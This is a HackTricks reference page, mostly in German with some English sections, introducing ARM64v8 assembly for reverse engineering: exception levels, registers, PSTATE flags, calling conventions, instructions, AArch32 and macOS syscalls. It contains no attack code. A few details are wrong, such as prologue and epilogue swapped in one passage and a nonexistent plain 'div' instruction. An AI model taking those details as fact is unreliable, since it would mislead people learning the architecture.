# Einführung in ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

In der ARMv8-Architektur definieren Ausführungsebenen, bekannt als Exception Levels (ELs), das Privileglevel und die Fähigkeiten der Ausführungsumgebung. Es gibt vier Exception Levels, von EL0 bis EL3, die jeweils einen anderen Zweck erfüllen:

1. **EL0 - User Mode**:
- Dies ist die am wenigsten privilegierte Ebene und wird zum Ausführen regulärer Anwendungssoftware verwendet.
- Anwendungen, die in EL0 laufen, sind voneinander und vom Systemsoftware-Bereich isoliert, was Sicherheit und Stabilität erhöht.
2. **EL1 - Operating System Kernel Mode**:
- Die meisten Betriebssystem-Kernel laufen auf dieser Ebene.
- EL1 hat mehr Privilegien als EL0 und kann auf Systemressourcen zugreifen, jedoch mit einigen Einschränkungen, um die Systemintegrität zu gewährleisten. Du wechselst von EL0 zu EL1 mit der `SVC`-Anweisung.
3. **EL2 - Hypervisor Mode**:
- Diese Ebene wird für Virtualisierung verwendet. Ein Hypervisor, der in EL2 läuft, kann mehrere Betriebssysteme (jeweils in ihrem eigenen EL1) auf derselben physischen Hardware verwalten.
- EL2 bietet Funktionen zur Isolation und Kontrolle der virtualisierten Umgebungen.
- Daher können virtuelle Maschinen-Anwendungen wie Parallels das `hypervisor.framework` nutzen, um mit EL2 zu interagieren und virtuelle Maschinen zu betreiben, ohne Kernel-Extensions zu benötigen.
- Um von EL1 nach EL2 zu wechseln, wird die `HVC`-Anweisung verwendet.
4. **EL3 - Secure Monitor Mode**:
- Dies ist die privilegierteste Ebene und wird oft für Secure Boot und Trusted Execution Environments verwendet.
- EL3 kann Zugriffe zwischen sicheren und nicht-sicheren Zuständen verwalten und kontrollieren (z. B. secure boot, trusted OS usw.).
- Es wurde in macOS für KPP (Kernel Patch Protection) verwendet, aber nicht mehr.
- EL3 wird von Apple nicht mehr genutzt.
- Der Übergang zu EL3 erfolgt typischerweise mittels der `SMC` (Secure Monitor Call)-Anweisung.

Die Nutzung dieser Ebenen erlaubt eine strukturierte und sichere Verwaltung verschiedener Systemaspekte, von Benutzeranwendungen bis zur am höchsten privilegierten Systemsoftware. Der ARMv8-Ansatz zu Privilegleveln hilft, verschiedene Systemkomponenten effektiv zu isolieren und dadurch die Sicherheit und Robustheit des Systems zu verbessern.

## **Register (ARM64v8)**

ARM64 hat **31 allgemeine Register**, bezeichnet `x0` bis `x30`. Jedes kann einen **64-Bit** (8-Byte) Wert speichern. Für Operationen, die nur 32-Bit-Werte benötigen, können dieselben Register im 32-Bit-Modus über die Namen `w0` bis `w30` angesprochen werden.

1. **`x0`** bis **`x7`** - Diese werden typischerweise als temporäre Register und zum Übergeben von Parametern an Subroutinen verwendet.
- **`x0`** trägt auch die Rückgabedaten einer Funktion.
2. **`x8`** - Im Linux-Kernel wird `x8` als Systemaufrufnummer für die `svc`-Anweisung verwendet. **In macOS ist `x16` diejenige, die verwendet wird!**
3. **`x9`** bis **`x15`** - Weitere temporäre Register, oft für lokale Variablen verwendet.
4. **`x16`** und **`x17`** - **Intra-procedural Call Registers**. Temporäre Register für Immediate-Werte. Sie werden auch für indirekte Funktionsaufrufe und PLT-Stubs (Procedure Linkage Table) verwendet.
- **`x16`** wird als **Systemaufrufnummer** für die **`svc`**-Anweisung in **macOS** genutzt.
5. **`x18`** - **Platform register**. Es kann als allgemeines Register verwendet werden, aber auf einigen Plattformen ist dieses Register für plattformspezifische Zwecke reserviert: Pointer zur aktuellen Thread-Umgebungsstruktur in Windows oder zum aktuell **ausführenden task structure im linux kernel**.
6. **`x19`** bis **`x28`** - Diese sind callee-saved Register. Eine Funktion muss die Werte dieser Register für ihren Aufrufer bewahren, daher werden sie auf dem Stack gespeichert und vor dem Zurückkehren zum Aufrufer wiederhergestellt.
7. **`x29`** - **Frame pointer**, um den Stack-Frame nachzuverfolgen. Wenn ein neuer Stack-Frame erstellt wird, weil eine Funktion aufgerufen wird, wird das **`x29`**-Register **auf dem Stack gespeichert** und die **neue** Frame-Pointer-Adresse (die Adresse von **`sp`**) in dieses Register geschrieben.
- Dieses Register kann auch als **allgemeines Register** verwendet werden, obwohl es üblicherweise als Referenz für **lokale Variablen** dient.
8. **`x30`** oder **`lr`** - **Link register**. Es hält die **Rücksprungadresse**, wenn eine `BL` (Branch with Link) oder `BLR` (Branch with Link to Register)-Anweisung ausgeführt wird, indem der Wert des **`pc`** in dieses Register gespeichert wird.
- Es kann wie jedes andere Register verwendet werden.
- Wenn die aktuelle Funktion eine neue Funktion aufruft und dadurch `lr` überschrieben wird, wird es zu Beginn in den Stack gespeichert (das ist das Epilog: `stp x29, x30 , [sp, #-48]; mov x29, sp` -> Speichere `fp` und `lr`, reserviere Platz und setze neuen `fp`) und am Ende wiederhergestellt (das ist das Prolog: `ldp x29, x30, [sp], #48; ret` -> Stelle `fp` und `lr` wieder her und return).
9. **`sp`** - **Stack pointer**, verwendet, um die Spitze des Stacks zu verfolgen.
- Der **`sp`**-Wert muss immer mindestens auf **quadword**-Ausrichtung gehalten werden, sonst kann eine Align-Ausnahme auftreten.
10. **`pc`** - **Program counter**, der auf die nächste Anweisung zeigt. Dieses Register kann nur durch Ausnahmeauslösungen, Ausnahme-Rückgaben und Branches aktualisiert werden. Die einzigen gewöhnlichen Anweisungen, die dieses Register lesen können, sind Branch-with-link-Anweisungen (BL, BLR), um die **`pc`**-Adresse in **`lr`** (Link Register) zu speichern.
11. **`xzr`** - **Zero register**. Auch als **`wzr`** in seiner **32**-Bit-Registerform bezeichnet. Kann verwendet werden, um leicht den Nullwert zu erhalten (häufige Operation) oder Vergleiche mit **`subs`** durchzuführen wie **`subs XZR, Xn, #10`**, wobei das Ergebnis nirgendwo (in **`xzr`**) gespeichert wird.

Die **`Wn`**-Register sind die **32bit**-Version der **`Xn`**-Register.

> [!TIP]
> Die Register von X0 - X18 sind volatil, was bedeutet, dass ihre Werte durch Funktionsaufrufe und Interrupts verändert werden können. Die Register von X19 - X28 sind hingegen nicht-volatile, das heißt, ihre Werte müssen über Funktionsaufrufe hinweg erhalten bleiben ("callee saved").

### SIMD and Floating-Point Registers

Außerdem gibt es weitere **32 Register mit 128-Bit-Länge**, die in optimierten SIMD-Operationen (Single Instruction Multiple Data) und für Gleitkommaberechnungen verwendet werden können. Diese heißen die Vn-Register, obwohl sie auch in **64**-Bit, **32**-Bit, **16**-Bit und **8**-Bit betrieben werden können und dann **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** und **`Bn`** genannt werden.

### System Registers

**Es gibt Hunderte von Systemregistern**, auch Special-Purpose-Registers (SPRs) genannt, die zur **Überwachung** und **Steuerung** des Prozessorverhaltens verwendet werden.\
Sie können nur mit den speziellen Instruktionen **`mrs`** und **`msr`** gelesen oder gesetzt werden.

Die Spezialregister **`TPIDR_EL0`** und **`TPIDDR_EL0`** tauchen häufig beim Reverse Engineering auf. Das Suffix `EL0` gibt die **minimal notwendige Exception-Ebene** an, aus der das Register zugänglich ist (in diesem Fall ist EL0 die reguläre Exception-/Privileg-Ebene, in der Programme laufen).\
Sie werden oft verwendet, um die **Basisadresse des thread-local storage** Speicherbereichs abzulegen. Üblicherweise ist das erste lesbar und schreibbar für Programme in EL0, während das zweite von EL0 gelesen und von EL1 (z. B. Kernel) geschrieben werden kann.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** enthält mehrere Prozesskomponenten, die in das vom Betriebssystem sichtbare Spezialregister **`SPSR_ELx`** serialisiert werden, wobei X das **Berechtigungslevel** der ausgelösten Exception ist (dies ermöglicht die Wiederherstellung des Prozesszustands, wenn die Exception endet).\
Dies sind die zugänglichen Felder:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** und **`V`** Bedingungsflag:
- **`N`** bedeutet, die Operation ergab ein negatives Ergebnis
- **`Z`** bedeutet, die Operation ergab Null
- **`C`** bedeutet, die Operation hat ein Carry (Übertrag)
- **`V`** bedeutet, die Operation ergab einen vorzeichenbehafteten Überlauf:
- Die Summe von zwei positiven Zahlen ergibt ein negatives Ergebnis.
- Die Summe von zwei negativen Zahlen ergibt ein positives Ergebnis.
- Bei Subtraktion, wenn eine große negative Zahl von einer kleineren positiven Zahl subtrahiert wird (oder umgekehrt) und das Ergebnis nicht innerhalb des darstellbaren Bereichs der Bitlänge liegt.
- Offensichtlich weiß der Prozessor nicht, ob die Operation vorzeichenbehaftet ist oder nicht, also prüft er C und V in den Operationen und zeigt an, ob ein Carry aufgetreten ist, je nachdem ob es vorzeichenbehaftet oder nicht war.

> [!WARNING]
> Nicht alle Instruktionen aktualisieren diese Flags. Einige wie **`CMP`** oder **`TST`** tun es, und andere mit einem s-Suffix wie **`ADDS`** tun es ebenfalls.

- Das aktuelle **Registerbreiten-Flag (`nRW`)**: Wenn das Flag den Wert 0 hält, läuft das Programm nach dem Fortsetzen im AArch64-Ausführungszustand.
- Das aktuelle **Exception Level** (**`EL`**): Ein reguläres Programm, das in EL0 läuft, hat den Wert 0.
- Das **Single-Stepping**-Flag (**`SS`**): Wird von Debuggern verwendet, um Schritt-für-Schritt auszuführen, indem das SS-Flag in **`SPSR_ELx`** über eine Exception gesetzt wird. Das Programm führt einen Schritt aus und löst eine Single-Step-Exception aus.
- Das Flag für **illegale Exception-Zustände** (**`IL`**): Es markiert, wenn privilegierte Software eine ungültige Exception-Level-Übertragung durchführt; dieses Flag wird auf 1 gesetzt und der Prozessor löst eine Illegal State Exception aus.
- Die **`DAIF`**-Flags: Diese Flags erlauben einem privilegierten Programm, bestimmte externe Exceptions selektiv zu maskieren.
- Wenn **`A`** 1 ist, bedeutet das, dass **asynchrone Aborts** ausgelöst werden. **`I`** konfiguriert die Reaktion auf externe Hardware-Interrupt-Requests (IRQs). Und das F bezieht sich auf **Fast Interrupt Requests** (FIQs).
- Die Flags zur Auswahl des Stack-Pointers (**`SPS`**): Privilegierte Programme, die in EL1 und höher laufen, können zwischen der Verwendung ihres eigenen Stack-Pointer-Registers und dem user-mode Stack-Pointer wechseln (z. B. zwischen `SP_EL1` und `EL0`). Dieses Umschalten wird durch Schreiben in das spezielle Register **`SPSel`** durchgeführt. Dies kann nicht von EL0 aus durchgeführt werden.

## **Calling Convention (ARM64v8)**

Die ARM64-Calling-Convention legt fest, dass die **ersten acht Parameter** einer Funktion in den Registern **`x0` bis `x7`** übergeben werden. **Weitere** Parameter werden auf dem **Stack** übergeben. Der **Rückgabewert** wird in Register **`x0`** zurückgegeben, oder zusätzlich in **`x1`**, falls er **128 Bit** lang ist. Die Register **`x19` bis `x30`** und **`sp`** müssen über Funktionsaufrufe hinweg **beibehalten** werden.

Beim Lesen einer Funktion in Assembly achte auf die **Function Prologue und Epilogue**. Die **Prologue** beinhaltet üblicherweise das **Sichern des Frame-Pointers (`x29`)**, das **Setzen** eines **neuen Frame-Pointers** und das **Allokieren von Stack-Speicher**. Die **Epilogue** beinhaltet üblicherweise das **Wiederherstellen des gespeicherten Frame-Pointers** und das **Zurückkehren** aus der Funktion.

### Calling Convention in Swift

Swift hat seine eigene **Calling Convention**, die in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) zu finden ist.

## **Common Instructions (ARM64v8)**

ARM64-Instruktionen haben im Allgemeinen das **Format `opcode dst, src1, src2`**, wobei **`opcode`** die auszuführende Operation ist (wie `add`, `sub`, `mov` usw.), **`dst`** das Zielregister ist, in dem das Ergebnis gespeichert wird, und **`src1`** und **`src2`** die Quellregister sind. Immediate-Werte können auch anstelle von Quellregistern verwendet werden.

- **`mov`**: **Verschiebe** einen Wert von einem **Register** in ein anderes.
- Beispiel: `mov x0, x1` — Verschiebt den Wert von `x1` nach `x0`.
- **`ldr`**: **Lade** einen Wert aus dem **Speicher** in ein **Register**.
- Beispiel: `ldr x0, [x1]` — Lädt einen Wert aus der Speicheradresse, auf die `x1` zeigt, in `x0`.
- **Offset-Modus**: Ein Offset, das den Ursprungspointer beeinflusst, wird angezeigt, z. B.:
- `ldr x2, [x1, #8]`, lädt in x2 den Wert von x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, lädt in x2 ein Objekt aus dem Array x0, von der Position x1 (Index) * 4
- **Pre-indexed Modus**: Dies wendet Berechnungen auf den Ursprung an, erhält das Resultat und speichert zudem den neuen Ursprung.
- `ldr x2, [x1, #8]!`, lädt `x1 + 8` in `x2` und speichert in x1 das Ergebnis von `x1 + 8`
- `str lr, [sp, #-4]!`, speichert das Link-Register in sp und aktualisiert das Register sp
- **Post-index Modus**: Dies ist wie der vorherige, aber die Speicheradresse wird zuerst gelesen und dann das Offset berechnet und gespeichert.
- `ldr x0, [x1], #8`, lädt x1 in x0 und aktualisiert x1 mit `x1 + 8`
- **PC-relatives Adressieren**: In diesem Fall wird die zu ladende Adresse relativ zum PC berechnet.
- `ldr x1, =_start`, Dies lädt die Adresse, an der das Symbol `_start` beginnt, in x1 relativ zum aktuellen PC.
- **`str`**: **Speichere** einen Wert aus einem **Register** in den **Speicher**.
- Beispiel: `str x0, [x1]` — Speichert den Wert in `x0` an der Speicherstelle, auf die `x1` zeigt.
- **`ldp`**: **Load Pair of Registers**. Diese Instruktion **lädt zwei Register** aus **aufeinanderfolgenden Speicheradressen**. Die Speicheradresse wird typischerweise gebildet, indem ein Offset zu einem anderen Register addiert wird.
- Beispiel: `ldp x0, x1, [x2]` — Lädt `x0` und `x1` aus den Speicheradressen `x2` bzw. `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Diese Instruktion **speichert zwei Register** in **aufeinanderfolgende Speicheradressen**.
- Beispiel: `stp x0, x1, [sp]` — Speichert `x0` und `x1` an den Speicherstellen `sp` bzw. `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Speichert `x0` und `x1` an den Speicherstellen `sp+16` und `sp + 24` und aktualisiert `sp` mit `sp+16`.
- **`add`**: **Addiere** die Werte von zwei Registern und speichere das Ergebnis in einem Register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (Register oder Immediate)
- \[shift #N | RRX] -> Führe eine Verschiebung durch oder rufe RRX
- Beispiel: `add x0, x1, x2` — Addiert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- `add x5, x5, #1, lsl #12` — Dies entspricht 4096 (eine 1 um 12 Stellen verschoben) -> 1 0000 0000 0000 0000
- **`adds`** Führt ein `add` aus und aktualisiert die Flags.
- **`sub`**: **Subtrahiere** die Werte von zwei Registern und speichere das Ergebnis in einem Register.
- Siehe **`add`** **Syntax**.
- Beispiel: `sub x0, x1, x2` — Subtrahiert den Wert in `x2` von `x1` und speichert das Ergebnis in `x0`.
- **`subs`**: Wie `sub`, aktualisiert jedoch die Flags.
- **`mul`**: **Multipliziere** die Werte von **zwei Registern** und speichere das Ergebnis in einem Register.
- Beispiel: `mul x0, x1, x2` — Multipliziert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- **`div`**: **Dividiere** den Wert eines Registers durch ein anderes und speichere das Ergebnis in einem Register.
- Beispiel: `div x0, x1, x2` — Dividiert den Wert in `x1` durch `x2` und speichert das Ergebnis in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Fügt am Ende Nullen hinzu und verschiebt die übrigen Bits nach vorne (multipliziert mit 2^n).
- **Logical shift right**: Fügt am Anfang Nullen hinzu und verschiebt die Bits nach hinten (dividiert um 2^n bei unsigned).
- **Arithmetic shift right**: Wie **`lsr`**, aber anstelle Nullen hinzuzufügen, werden bei gesetztem Most-Significant-Bit Einsen hinzugefügt (dividiert um 2^n bei signed).
- **Rotate right**: Wie **`lsr`**, aber die entfernten Bits werden links wieder angehängt.
- **Rotate Right with Extend**: Wie **`ror`**, aber mit dem Carry-Flag als "most significant bit". Das Carry-Flag wird in Bit 31 verschoben und das entfernte Bit ins Carry-Flag geschrieben.
- **`bfm`**: **Bit Field Move**, diese Operationen **kopieren Bits `0...n`** aus einem Wert und platzieren sie in Positionen **`m..m+n`**. Das **`#s`** spezifiziert die **linkeste Bit-Position** und **`#r`** die **Rotate-Right-Anzahl**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopiert ein Bitfeld aus einem Register und fügt es in ein anderes Register ein.
- **`BFI X1, X2, #3, #4`** Insertiert 4 Bits von X2 ab Bit 3 in X1.
- **`BFXIL X1, X2, #3, #4`** Extrahiert ab Bit 3 von X2 vier Bits und kopiert sie nach X1.
- **`SBFIZ X1, X2, #3, #4`** Sign-extendiert 4 Bits von X2 und fügt sie in X1 ab Bitposition 3 ein, wobei die rechten Bits auf 0 gesetzt werden.
- **`SBFX X1, X2, #3, #4`** Extrahiert 4 Bits ab Bit 3 von X2, sign-extendiert sie und legt das Ergebnis in X1 ab.
- **`UBFIZ X1, X2, #3, #4`** Zero-extendiert 4 Bits von X2 und fügt sie in X1 ab Bitposition 3 ein, wobei die rechten Bits auf 0 gesetzt werden.
- **`UBFX X1, X2, #3, #4`** Extrahiert 4 Bits ab Bit 3 von X2 und legt das zero-extendierte Ergebnis in X1 ab.
- **Sign Extend To X:** Erweitert das Vorzeichen (oder fügt Nullen im unsigned-Fall hinzu), um Operationen mit dem Wert auszuführen:
- **`SXTB X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 nach X1** (`W2` ist die untere Hälfte von `X2`) auf 64 Bit.
- **`SXTH X1, W2`** Erweitert das Vorzeichen einer 16-Bit-Zahl **von W2 nach X1** auf 64 Bit.
- **`SXTW X1, W2`** Erweitert das Vorzeichen eines 32-Bit-Werts **von W2 nach X1** auf 64 Bit.
- **`UXTB X1, W2`** Fügt Nullen (unsigned) zu einem Byte **von W2 nach X1** hinzu, um die 64 Bit zu füllen.
- **`extr`**: Extrahiert Bits aus einem angegebenen **Paar von Registern, die konkatenieren**.
- Beispiel: `EXTR W3, W2, W1, #3` Wird **W1+W2** konkatenieren und **von Bit 3 von W2 bis Bit 3 von W1** nehmen und es in W3 speichern.
- **`cmp`**: **Vergleicht** zwei Register und setzt Bedingungsflags. Es ist ein **Alias von `subs`**, der das Zielregister auf das Zero-Register setzt. Nützlich, um zu prüfen, ob `m == n`.
- Es unterstützt dieselbe Syntax wie `subs`.
- Beispiel: `cmp x0, x1` — Vergleicht die Werte in `x0` und `x1` und setzt entsprechend die Flags.
- **`cmn`**: **Compare negative** Operand. In diesem Fall ist es ein **Alias von `adds`** und unterstützt dieselbe Syntax. Nützlich, um zu prüfen, ob `m == -n`.
- **`ccmp`**: Konditionaler Vergleich, ein Vergleich, der nur ausgeführt wird, wenn ein vorheriger Vergleich wahr war und spezifisch die nzcv-Bits setzt.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> wenn x1 != x2 und x3 < x4, springe zu func
- Das liegt daran, dass **`ccmp`** nur ausgeführt wird, wenn der vorherige `cmp` ein `NE` war; wenn nicht, werden die Bits `nzcv` auf 0 gesetzt (was den `blt`-Vergleich nicht erfüllt).
- Dies kann auch als `ccmn` verwendet werden (ähnlich, aber negativ, wie `cmp` vs `cmn`).
- **`tst`**: Prüft, ob eines der angegebenen Bits gesetzt ist (funktioniert wie ANDS ohne Speicherung des Ergebnisses). Nützlich, um ein Register gegen einen Wert zu prüfen und zu sehen, ob eines der durch den Wert angegebenen Bits 1 ist.
- Beispiel: `tst X1, #7` Prüft, ob eines der letzten 3 Bits von X1 1 ist.
- **`teq`**: XOR-Operation, verwirft das Ergebnis.
- **`b`**: Unbedingter Branch.
- Beispiel: `b myFunction`
- Beachte, dass dies nicht das Link-Register mit der Rücksprungadresse füllt (nicht geeignet für Subroutinenaufrufe, die zurückkehren müssen).
- **`bl`**: **Branch** with link, verwendet, um eine **Subroutine aufzurufen**. Speichert die **Rücksprungadresse in `x30`**.
- Beispiel: `bl myFunction` — Ruft die Funktion `myFunction` auf und speichert die Rücksprungadresse in `x30`.
- **`blr`**: **Branch** with Link to Register, verwendet, um eine **Subroutine aufzurufen**, deren Ziel in einem **Register** steht. Speichert die Rücksprungadresse in `x30`.
- Beispiel: `blr x1` — Ruft die Funktion auf, deren Adresse in `x1` steht, und speichert die Rücksprungadresse in `x30`.
- **`ret`**: **Rückkehr** aus einer **Subroutine**, typischerweise unter Verwendung der Adresse in **`x30`**.
- Beispiel: `ret` — Kehrt aus der aktuellen Subroutine mit der Rücksprungadresse in `x30` zurück.
- **`b.<cond>`**: Konditionale Branches.
- **`b.eq`**: **Branch if equal**, basierend auf dem vorherigen `cmp`.
- Beispiel: `b.eq label` — Wenn der vorherige `cmp` gleiche Werte festgestellt hat, springt dies zu `label`.
- **`b.ne`**: **Branch if Not Equal**. Diese Instruktion prüft die Condition-Flags (gesetzt durch eine vorherige Vergleichsinstruktion) und springt, wenn die verglichenen Werte nicht gleich waren.
- Beispiel: Nach `cmp x0, x1` bewirkt `b.ne label` — Wenn die Werte in `x0` und `x1` ungleich sind, springt dies zu `label`.
- **`cbz`**: **Compare and Branch on Zero**. Diese Instruktion vergleicht ein Register mit Null und springt, wenn es gleich Null ist.
- Beispiel: `cbz x0, label` — Wenn der Wert in `x0` Null ist, springt dies zu `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Diese Instruktion vergleicht ein Register mit Null und springt, wenn es nicht Null ist.
- Beispiel: `cbnz x0, label` — Wenn der Wert in `x0` ungleich Null ist, springt dies zu `label`.
- **`tbnz`**: Test bit and branch on nonzero.
- Beispiel: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero.
- Beispiel: `tbz x0, #8, label`
- **Konditionale Select-Operationen**: Diese Operationen variieren ihr Verhalten abhängig von den Condition-Bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Wenn true, X0 = X1, sonst X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Wenn true, Xd = Xn, sonst Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Wenn true, Xd = Xn + 1, sonst Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Wenn true, Xd = Xn, sonst Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Wenn true, Xd = NOT(Xn), sonst Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Wenn true, Xd = Xn, sonst Xd = - Xm
- `cneg Xd, Xn, cond` -> Wenn true, Xd = - Xn, sonst Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Wenn true, Xd = 1, sonst Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Wenn true, Xd = \<all 1>, sonst Xd = 0
- **`adrp`**: Berechnet die **Page-Adresse eines Symbols** und speichert sie in einem Register.
- Beispiel: `adrp x0, symbol` — Berechnet die Seitenadresse von `symbol` und speichert sie in `x0`.
- **`ldrsw`**: **Lädt** einen vorzeichenbehafteten **32-Bit**-Wert aus dem Speicher und **sign-extendiert** ihn auf 64 Bit. Wird oft für SWITCH-Cases verwendet.
- Beispiel: `ldrsw x0, [x1]` — Lädt einen vorzeichenbehafteten 32-Bit-Wert aus der Speicherstelle, auf die `x1` zeigt, sign-extendiert ihn auf 64 Bit und speichert ihn in `x0`.
- **`stur`**: **Speichert** den Wert eines Registers an einer Speicheradresse unter Verwendung eines Offsets von einem anderen Register.
- Beispiel: `stur x0, [x1, #4]` — Speichert den Wert in `x0` an der Speicheradresse `x1 + 4`.
- **`svc`** : Führt einen **System Call** aus. Steht für "Supervisor Call". Wenn der Prozessor diese Instruktion ausführt, wechselt er vom User- in den Kernel-Modus und springt zu einer speziellen Stelle im Speicher, an der der Kernel-Code zur Handhabung von Systemaufrufen liegt.

- Beispiel:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Neuen frame pointer setzen**: `mov x29, sp` (setzt den neuen frame pointer für die aktuelle Funktion)
3. **Platz auf dem stack für lokale Variablen reservieren** (falls erforderlich): `sub sp, sp, <size>` (wobei `<size>` die benötigte Anzahl Bytes ist)

### **Funktions-Epilog**

1. **Lokale Variablen freigeben (falls welche allokiert wurden)**: `add sp, sp, <size>`
2. **Link register und frame pointer wiederherstellen**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gibt die Kontrolle an den Aufrufer zurück unter Verwendung der Adresse im Link-Register)

## ARM Allgemeine Speicher-Schutzmechanismen

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Ausführungszustand

Armv8-A unterstützt die Ausführung von 32-Bit-Programmen. **AArch32** kann in einem von **zwei Instruktionssätzen** laufen: **`A32`** und **`T32`** und kann mittels **`interworking`** zwischen ihnen wechseln.\
**Privilegierte** 64-Bit-Programme können die **Ausführung von 32-Bit**-Programmen planen, indem sie einen exception level-Transfer zur niedriger privilegierten 32-Bit-Ebene ausführen.\
Beachte, dass der Übergang von 64-Bit zu 32-Bit mit einer niedrigeren exception level erfolgt (zum Beispiel ein 64-Bit-Programm in EL1, das ein Programm in EL0 auslöst). Dies geschieht, indem das **Bit 4 von** **`SPSR_ELx`** Special-Register **auf 1 gesetzt** wird, wenn der `AArch32`-Prozess-Thread zur Ausführung bereit ist, und der Rest von `SPSR_ELx` die CPSR des **`AArch32`**-Programms speichert. Dann ruft der privilegierte Prozess die **`ERET`**-Instruktion auf, sodass der Prozessor in **`AArch32`** wechselt und in A32 oder T32 eintritt, abhängig von CPSR**.**

Das **`interworking`** erfolgt über die J- und T-Bits der CPSR. `J=0` und `T=0` bedeutet **`A32`** und `J=0` und `T=1` bedeutet **T32**. Das bedeutet im Wesentlichen, dass das **niederwertigste Bit auf 1** gesetzt wird, um anzuzeigen, dass der Instruktionssatz T32 ist.\
Dies wird während der **interworking branch instructions,** gesetzt, kann aber auch direkt mit anderen Instruktionen gesetzt werden, wenn das PC als Zielregister gesetzt wird. Beispiel:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Aktuelles Programmstatus-Register

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
- **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.

The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
- **`E`** bit: Indicates the **endianness**.
- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

